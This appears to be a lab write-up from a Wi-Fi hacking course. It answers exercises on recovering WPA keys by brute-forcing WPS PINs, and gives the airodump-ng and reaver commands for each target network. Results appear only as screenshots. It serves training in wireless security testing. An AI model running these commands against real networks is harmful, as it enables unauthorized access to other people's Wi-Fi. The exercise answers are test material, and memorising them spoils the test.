# [Online PIN Brute-Forcing Using Reaver](Online%20PIN%20Brute-Forcing%20Using%20Reaver.md)
### What is the WPA PSK for the WIFI Network named HackTheWifi?

![](Screenshot%202026-09-21%20at%2008.30.08.png)

```sh
airodump-ng mon0 --wps
```

![](Screenshot%202026-09-21%20at%2008.31.14.png)

```sh
reaver -i mon -b 3A:DB:F3:0A:2E:EA -c 1
```

![](Screenshot%202026-09-21%20at%2008.33.45.png)
### What is the WPA PSK for the WIFI Network named Corp-VPN?

```sh
reaver -i mon -b DE:10:37:65:10:2C -c 1 -p " "
```

![](Screenshot%202026-09-21%20at%2008.41.45.png)
### The first 4 digits of the WPS PIN for the WiFi network named CyberNetSecure are 8487. What are the remaining 4 digits?

```sh
reaver -b D8:D7:3D:EB:29:D5 -c 1 -i mon0 -p 8487
```

![](Screenshot%202026-09-21%20at%2008.50.19.png)